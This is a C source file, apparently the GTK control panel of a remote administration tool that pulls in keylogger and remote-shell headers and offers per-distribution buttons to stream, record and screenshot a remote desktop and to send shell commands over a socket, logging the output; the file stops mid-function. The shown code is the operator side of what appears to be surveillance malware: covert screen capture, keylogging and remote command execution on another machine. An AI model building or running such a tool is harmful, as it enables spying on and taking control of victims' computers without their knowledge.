#include <stdio.h>
#include <stdlib.h>
#include <string.h>  //strlen()

#include <sys/types.h>  // send()
#include <sys/socket.h>  // send()
#include <netinet/in.h>  // SOCKADDR_IN
#include <arpa/inet.h>  // inet_addr()
#include <netdb.h>  //gethostbyaddr()

#include <pthread.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"
#include "../includes/callback.h"

#include "../includes/ubuntu_options.h"
#include "../includes/mint_options.h"
#include "../includes/kali_options.h"
#include "../includes/debian_options.h"

#include "../includes/utils.h"
#include "../includes/remote_shell.h"
#include "../includes/keylogger.h"


    //  CODER CORRECTEMENT LES FONCTIONS gtk_widget_set_sensitive(ubuntu_button[0], FALSE); A VERIFIER MAIS NORMALEMENT OK


GtkWidget *main_win;

const gchar *chemin;
GtkWidget *log_entry;

const gchar *server_ip;
const gchar *server_port;
int port;

GtkWidget *ubuntu_button[4];
GtkWidget *mint_button[4];
GtkWidget *debian_button[4];
GtkWidget *kali_button[4];

SOCKET remote_shell_sock;
GtkWidget *text_view;


GtkWidget *background;
GtkWidget *background2;
GtkWidget *background3;
GtkWidget *background4;
GtkWidget *death_face_image;


void get_server_ip(GtkButton *button, gpointer user_data)
{
    server_ip = gtk_entry_get_text(GTK_ENTRY(user_data));
}

void get_server_port(GtkButton *button, gpointer user_data)
{
    server_port = gtk_entry_get_text(GTK_ENTRY(user_data));
}

void open_file(GtkButton *button, gpointer user_data)
{
    GtkWidget *fileSelect = NULL;

    fileSelect = gtk_file_selection_new("Select your file");

    gtk_file_selection_set_filename(GTK_FILE_SELECTION(fileSelect), "/");

    gtk_widget_show(fileSelect);

    g_signal_connect(GTK_FILE_SELECTION(fileSelect)->ok_button, "clicked", G_CALLBACK(get_path), fileSelect);
    g_signal_connect_swapped(G_OBJECT(GTK_FILE_SELECTION(fileSelect)->cancel_button), "clicked", G_CALLBACK(gtk_widget_destroy), fileSelect);

    return;
}

void get_path(GtkWidget *bouton, GtkWidget *file_selection)
{
    //const gchar *chemin = NULL;

    chemin = gtk_file_selection_get_filename(GTK_FILE_SELECTION(file_selection));

    g_signal_connect_swapped(GTK_FILE_SELECTION(file_selection)->ok_button, "clicked", G_CALLBACK(get_file_name), file_selection);
    g_signal_connect_swapped(GTK_FILE_SELECTION(file_selection)->cancel_button, "clicked", G_CALLBACK(gtk_widget_destroy), file_selection);

    gtk_widget_destroy(file_selection);

    get_file_name();

    return;
}

void cb_ubuntu_watch(GtkWidget *toggle, gpointer data)
{
    GtkWidget *stream_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(ubuntu_button[0], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[1], FALSE);
        gtk_widget_set_sensitive(ubuntu_button[2], FALSE);
        gtk_widget_set_sensitive(ubuntu_button[3], FALSE);

        stream_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Are you sure you want to stream the remote desktop?");

        switch(gtk_dialog_run(GTK_DIALOG(stream_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(stream_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(ubuntu_button[0]), FALSE);
                ubuntu_streaming_watch(data);
                free(data);
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(ubuntu_button[0]), FALSE);
                gtk_widget_destroy(stream_webcam);
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(ubuntu_button[0], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[1], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[2], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[3], TRUE);
    }
}


//const gchar *command = "ffmpeg -s 1920x1080 -f x11grab -t 30 -i :0.0 /home/thibault/Bureau/record.flv";

//const gchar *command = "ffmpeg -s 1920x1080 -f x11grab -i -t 30 :1 /root/Bureau/record.flv";  //pour kali linux

//const gchar *command = "ffmpeg -video_size 1920x1080 -framerate 25 -f x11grab -t 30 -i :0.0 /home/thibault/Bureau/record.flv";


void cb_ubuntu_record(GtkWidget *toggle, gpointer data)
{
    GtkWidget *record_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(ubuntu_button[0], FALSE);
        gtk_widget_set_sensitive(ubuntu_button[1], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[2], FALSE);
        gtk_widget_set_sensitive(ubuntu_button[3], FALSE);

        record_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready to record the remote desktop.");

        switch(gtk_dialog_run(GTK_DIALOG(record_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(record_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(ubuntu_button[1]), FALSE);
                receive_remote_resolution();
                ubuntu_record();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(ubuntu_button[1]), FALSE);
                gtk_widget_destroy(record_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(ubuntu_button[0], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[1], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[2], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[3], TRUE);
    }
}

void cb_ubuntu_screenshot(GtkWidget *toggle, gpointer data)
{
    GtkWidget *screenshot_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(ubuntu_button[0], FALSE);
        gtk_widget_set_sensitive(ubuntu_button[1], FALSE);
        gtk_widget_set_sensitive(ubuntu_button[2], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[3], FALSE);

        screenshot_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Take a screenshot of the remote desktop ?");

        switch(gtk_dialog_run(GTK_DIALOG(screenshot_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(screenshot_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(ubuntu_button[2]), FALSE);
                receive_remote_resolution();
                ubuntu_screenshot();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(ubuntu_button[2]), FALSE);
                gtk_widget_destroy(screenshot_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(ubuntu_button[0], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[1], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[2], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[3], TRUE);
    }
}

void cb_ubuntu_mutli_screenshot(GtkWidget *toggle, gpointer data)
{
    GtkWidget *multi_screenshot_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(ubuntu_button[0], FALSE);
        gtk_widget_set_sensitive(ubuntu_button[1], FALSE);
        gtk_widget_set_sensitive(ubuntu_button[2], FALSE);
        gtk_widget_set_sensitive(ubuntu_button[3], TRUE);

        multi_screenshot_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready to take multi screenshots ?");

        switch(gtk_dialog_run(GTK_DIALOG(multi_screenshot_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(multi_screenshot_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(ubuntu_button[3]), FALSE);
                receive_remote_resolution();
                ubuntu_multi_screenshot();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(ubuntu_button[3]), FALSE);
                gtk_widget_destroy(multi_screenshot_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(ubuntu_button[0], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[1], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[2], TRUE);
        gtk_widget_set_sensitive(ubuntu_button[3], TRUE);
    }


}


/* MINT CALLBACKS */

void cb_mint_watch(GtkWidget *toggle, gpointer data)
{
    GtkWidget *stream_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(mint_button[0], TRUE);
        gtk_widget_set_sensitive(mint_button[1], FALSE);
        gtk_widget_set_sensitive(mint_button[2], FALSE);
        gtk_widget_set_sensitive(mint_button[3], FALSE);

        stream_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Are you sure you want to stream the remote desktop?");

        switch(gtk_dialog_run(GTK_DIALOG(stream_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(stream_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(mint_button[0]), FALSE);
                mint_streaming_watch(data);
                free(data);
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(mint_button[0]), FALSE);
                gtk_widget_destroy(stream_webcam);
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(mint_button[0], TRUE);
        gtk_widget_set_sensitive(mint_button[1], TRUE);
        gtk_widget_set_sensitive(mint_button[2], TRUE);
        gtk_widget_set_sensitive(mint_button[3], TRUE);
    }
}

void cb_mint_record(GtkWidget *toggle, gpointer data)
{
    GtkWidget *record_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(mint_button[0], FALSE);
        gtk_widget_set_sensitive(mint_button[1], TRUE);
        gtk_widget_set_sensitive(mint_button[2], FALSE);
        gtk_widget_set_sensitive(mint_button[3], FALSE);

        record_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready to record the remote desktop.");

        switch(gtk_dialog_run(GTK_DIALOG(record_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(record_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(mint_button[1]), FALSE);
                receive_remote_resolution();
                ubuntu_record();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(mint_button[1]), FALSE);
                gtk_widget_destroy(record_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(mint_button[0], TRUE);
        gtk_widget_set_sensitive(mint_button[1], TRUE);
        gtk_widget_set_sensitive(mint_button[2], TRUE);
        gtk_widget_set_sensitive(mint_button[3], TRUE);
    }
}
void cb_mint_screenshot(GtkWidget *toggle, gpointer data)
{
    GtkWidget *screenshot_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(mint_button[0], FALSE);
        gtk_widget_set_sensitive(mint_button[1], FALSE);
        gtk_widget_set_sensitive(mint_button[2], TRUE);
        gtk_widget_set_sensitive(mint_button[3], FALSE);

        screenshot_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Take a screenshot of the remote desktop ?");

        switch(gtk_dialog_run(GTK_DIALOG(screenshot_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(screenshot_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(mint_button[2]), FALSE);
                receive_remote_resolution();
                ubuntu_screenshot();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(mint_button[2]), FALSE);
                gtk_widget_destroy(screenshot_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(mint_button[0], TRUE);
        gtk_widget_set_sensitive(mint_button[1], TRUE);
        gtk_widget_set_sensitive(mint_button[2], TRUE);
        gtk_widget_set_sensitive(mint_button[3], TRUE);
    }
}

void cb_mint_mutli_screenshot(GtkWidget *toggle, gpointer data)
{
    GtkWidget *multi_screenshot_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(mint_button[0], FALSE);
        gtk_widget_set_sensitive(mint_button[1], FALSE);
        gtk_widget_set_sensitive(mint_button[2], FALSE);
        gtk_widget_set_sensitive(mint_button[3], TRUE);

        multi_screenshot_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready to take multi screenshots ?");

        switch(gtk_dialog_run(GTK_DIALOG(multi_screenshot_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(multi_screenshot_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(mint_button[3]), FALSE);
                receive_remote_resolution();
                mint_multi_screenshot();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(mint_button[3]), FALSE);
                gtk_widget_destroy(multi_screenshot_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(mint_button[0], TRUE);
        gtk_widget_set_sensitive(mint_button[1], TRUE);
        gtk_widget_set_sensitive(mint_button[2], TRUE);
        gtk_widget_set_sensitive(mint_button[3], TRUE);
    }


}

/* DEBIAN CALLBACKS */

void cb_debian_watch(GtkWidget *toggle, gpointer data)
{
    GtkWidget *stream_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(debian_button[0], TRUE);
        gtk_widget_set_sensitive(debian_button[1], FALSE);
        gtk_widget_set_sensitive(debian_button[2], FALSE);
        gtk_widget_set_sensitive(debian_button[3], FALSE);

        stream_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Are you sure you want to stream the remote desktop?");

        switch(gtk_dialog_run(GTK_DIALOG(stream_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(stream_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(debian_button[0]), FALSE);
                ubuntu_streaming_watch(data);
                free(data);
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(debian_button[0]), FALSE);
                gtk_widget_destroy(stream_webcam);
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(debian_button[0], TRUE);
        gtk_widget_set_sensitive(debian_button[1], TRUE);
        gtk_widget_set_sensitive(debian_button[2], TRUE);
        gtk_widget_set_sensitive(debian_button[3], TRUE);
    }
}

void cb_debian_record(GtkWidget *toggle, gpointer data)
{
    GtkWidget *record_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(debian_button[0], FALSE);
        gtk_widget_set_sensitive(debian_button[1], TRUE);
        gtk_widget_set_sensitive(debian_button[2], FALSE);
        gtk_widget_set_sensitive(debian_button[3], FALSE);

        record_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready to record the remote desktop.");

        switch(gtk_dialog_run(GTK_DIALOG(record_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(record_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(debian_button[1]), FALSE);
                receive_remote_resolution();
                debian_record();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(debian_button[1]), FALSE);
                gtk_widget_destroy(record_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(debian_button[0], TRUE);
        gtk_widget_set_sensitive(debian_button[1], TRUE);
        gtk_widget_set_sensitive(debian_button[2], TRUE);
        gtk_widget_set_sensitive(debian_button[3], TRUE);
    }
}


void cb_debian_screenshot(GtkWidget *toggle, gpointer data)
{
    GtkWidget *screenshot_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(debian_button[0], FALSE);
        gtk_widget_set_sensitive(debian_button[1], FALSE);
        gtk_widget_set_sensitive(debian_button[2], TRUE);
        gtk_widget_set_sensitive(debian_button[3], FALSE);

        screenshot_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Take a screenshot of the remote desktop ?");

        switch(gtk_dialog_run(GTK_DIALOG(screenshot_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(screenshot_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(debian_button[2]), FALSE);
                receive_remote_resolution();
                ubuntu_screenshot();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(debian_button[2]), FALSE);
                gtk_widget_destroy(screenshot_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(debian_button[0], TRUE);
        gtk_widget_set_sensitive(debian_button[1], TRUE);
        gtk_widget_set_sensitive(debian_button[2], TRUE);
        gtk_widget_set_sensitive(debian_button[3], TRUE);
    }
}

void cb_debian_mutli_screenshot(GtkWidget *toggle, gpointer data)
{
    GtkWidget *multi_screenshot_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(debian_button[0], FALSE);
        gtk_widget_set_sensitive(debian_button[1], FALSE);
        gtk_widget_set_sensitive(debian_button[2], FALSE);
        gtk_widget_set_sensitive(debian_button[3], TRUE);

        multi_screenshot_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready to take multi screenshots ?");

        switch(gtk_dialog_run(GTK_DIALOG(multi_screenshot_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(multi_screenshot_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(debian_button[3]), FALSE);
                receive_remote_resolution();
                ubuntu_multi_screenshot();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(debian_button[3]), FALSE);
                gtk_widget_destroy(multi_screenshot_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(debian_button[0], TRUE);
        gtk_widget_set_sensitive(debian_button[1], TRUE);
        gtk_widget_set_sensitive(debian_button[2], TRUE);
        gtk_widget_set_sensitive(debian_button[3], TRUE);
    }


}

/* KALI LINUX CALLBACKS */
void cb_kali_watch(GtkWidget *toggle, gpointer data)
{
    GtkWidget *stream_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(kali_button[0], TRUE);
        gtk_widget_set_sensitive(kali_button[1], FALSE);
        gtk_widget_set_sensitive(kali_button[2], FALSE);
        gtk_widget_set_sensitive(kali_button[3], FALSE);

        stream_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Are you sure you want to stream the remote desktop?");

        switch(gtk_dialog_run(GTK_DIALOG(stream_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(stream_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(kali_button[0]), FALSE);
                kali_streaming_watch(data);
                free(data);
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(kali_button[0]), FALSE);
                gtk_widget_destroy(stream_webcam);
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(kali_button[0], TRUE);
        gtk_widget_set_sensitive(kali_button[1], TRUE);
        gtk_widget_set_sensitive(kali_button[2], TRUE);
        gtk_widget_set_sensitive(kali_button[3], TRUE);
    }
}

void cb_kali_record(GtkWidget *toggle, gpointer data)
{
    GtkWidget *record_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(kali_button[0], FALSE);
        gtk_widget_set_sensitive(kali_button[1], TRUE);
        gtk_widget_set_sensitive(kali_button[2], FALSE);
        gtk_widget_set_sensitive(kali_button[3], FALSE);

        record_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready to record the remote desktop.");

        switch(gtk_dialog_run(GTK_DIALOG(record_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(record_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(kali_button[1]), FALSE);
                receive_remote_resolution();
                kali_record();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(kali_button[1]), FALSE);
                gtk_widget_destroy(record_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(kali_button[0], TRUE);
        gtk_widget_set_sensitive(kali_button[1], TRUE);
        gtk_widget_set_sensitive(kali_button[2], TRUE);
        gtk_widget_set_sensitive(kali_button[3], TRUE);
    }
}
void cb_kali_screenshot(GtkWidget *toggle, gpointer data)
{
    GtkWidget *screenshot_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(kali_button[0], FALSE);
        gtk_widget_set_sensitive(kali_button[1], FALSE);
        gtk_widget_set_sensitive(kali_button[2], TRUE);
        gtk_widget_set_sensitive(kali_button[3], FALSE);

        screenshot_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Take a screenshot of the remote desktop ?");

        switch(gtk_dialog_run(GTK_DIALOG(screenshot_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(screenshot_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(kali_button[2]), FALSE);
                receive_remote_resolution();
                kali_screenshot();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(kali_button[2]), FALSE);
                gtk_widget_destroy(screenshot_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(kali_button[0], TRUE);
        gtk_widget_set_sensitive(kali_button[1], TRUE);
        gtk_widget_set_sensitive(kali_button[2], TRUE);
        gtk_widget_set_sensitive(kali_button[3], TRUE);
    }
}

void cb_kali_mutli_screenshot(GtkWidget *toggle, gpointer data)
{
    GtkWidget *multi_screenshot_webcam = NULL;

    gboolean state = 0;

    state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(toggle));

    if(state == TRUE)
    {
        gtk_widget_set_sensitive(kali_button[0], FALSE);
        gtk_widget_set_sensitive(kali_button[1], FALSE);
        gtk_widget_set_sensitive(kali_button[2], FALSE);
        gtk_widget_set_sensitive(kali_button[3], TRUE);

        multi_screenshot_webcam = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready to take multi screenshots ?");

        switch(gtk_dialog_run(GTK_DIALOG(multi_screenshot_webcam)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(multi_screenshot_webcam);
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(kali_button[3]), FALSE);
                receive_remote_resolution();
                kali_multi_screenshot();
                break;

            case GTK_RESPONSE_NO:
                gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(kali_button[3]), FALSE);
                gtk_widget_destroy(multi_screenshot_webcam);
                break;

            default :
                break;
        }
    }

    if(state == FALSE)
    {
        gtk_widget_set_sensitive(kali_button[0], TRUE);
        gtk_widget_set_sensitive(kali_button[1], TRUE);
        gtk_widget_set_sensitive(kali_button[2], TRUE);
        gtk_widget_set_sensitive(kali_button[3], TRUE);
    }


}


void cb_close_connection(GtkButton *button, gpointer user_data)
{
    GtkWidget *close_pipe_line_dialog = NULL;

    close_pipe_line_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Do you really want to close the server connection ?");

    switch(gtk_dialog_run(GTK_DIALOG(close_pipe_line_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(close_pipe_line_dialog);
            close_connection();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(close_pipe_line_dialog);
            break;

        default :
            break;
    }

    return;
}

void start_remote_shell(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_remote_shell_dialog = NULL;

    launch_remote_shell_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch the Remote Shell ?");

    switch(gtk_dialog_run(GTK_DIALOG(launch_remote_shell_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_remote_shell_dialog);
            remote_shell();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_remote_shell_dialog);
            break;

        default :
            break;
    }

    return;
}


void send_cmd(GtkWidget *widget, gpointer user_data)
{
    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    gchar *utf8_text = NULL;

    FILE *log_cmd_results = NULL;

    char *buffer = NULL;
    const char *buffer_cmd = NULL;
    size_t data_len = 0;

    buffer_cmd = gtk_entry_get_text(GTK_ENTRY(user_data));

    buffer = malloc(BUFSIZ * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "send_cmd()");
        exit(-1);
    }

    log_cmd_results = fopen("/var/log/remote_shell.log", "a");
    if(log_cmd_results == NULL)
    {
        error("fopen()", "send_cmd()");
        exit(-1);
    }

    data_len = strlen(buffer_cmd) + 1;

    /* Envoie longueur de la cmd */
    if(send(remote_shell_sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("send() data_len", "send_cmd()");
        exit(-1);
    }

    /* Envoie de la cmd */
    if(send(remote_shell_sock, buffer_cmd, data_len, 0) == SOCKET_ERROR)
    {
        error("send() buffer_cmd", "send_cmd()");
        exit(-1);
    }

    if(strncmp(buffer_cmd, "quit", 4) == 0)
    {
        /* Obtaining the buffer associated with the widget */
        text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

        /* Set the default buffer text. */
        gtk_text_buffer_set_text(text_buffer, "You're disconnected ...", -1);

        /* Obtain iters for the start and end of points of the buffer */
        gtk_text_buffer_get_start_iter(text_buffer, &start);
        gtk_text_buffer_get_end_iter(text_buffer, &end);

        /* Get the entire buffer text */
        text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

        /* Print the text */
        g_print("%s", text);

        g_free(text);

        free(buffer);

        fclose(log_cmd_results);

        //close(remote_shell_sock);

        return;
    }

    /* Reception sortie de cmd */

    if(recv(remote_shell_sock, buffer, BUFSIZ, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "send_cmd()");
        exit(-1);
    }

    utf8_text = g_locale_to_utf8(buffer, strlen(buffer), NULL, NULL, NULL);

    /* Obtaining the buffer associated with the widget */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, utf8_text, -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    /* Ecriture de la sortie de commande dans le fichier log */
    if(fputs("Command:\n", log_cmd_results) == EOF)
    {
        error("fputs() :\\n", "send_cmd()");
        exit(-1);
    }

